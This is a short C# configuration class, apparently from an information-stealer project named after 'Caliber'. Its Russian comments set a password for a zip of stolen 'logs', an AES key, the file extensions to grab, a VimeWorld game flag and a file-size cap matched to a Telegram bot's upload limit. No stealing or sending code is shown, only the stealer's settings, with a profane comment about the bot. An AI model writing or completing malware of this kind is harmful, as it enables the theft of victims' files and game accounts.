namespace youknowcaliber
{
    class Config
    {
        public static readonly bool VimeWorld = true;

        public static string zipPass = "44"; //ПАРОЛЬ ОТ ЗИПКИ С ЛОГАМИ

        // Секретный Ключ AES
        public static string key = "Ql9.9e";

        // расширения
        public static string[] extensions = new string[]
        {
          ".txt"
        };

        // максимальный размер файла который может отправить тг бот = 20МБ, но это наебалово, хуй он отправит че то больше 8+-МБ
        public static int sizefile = 1250000;
    }
}
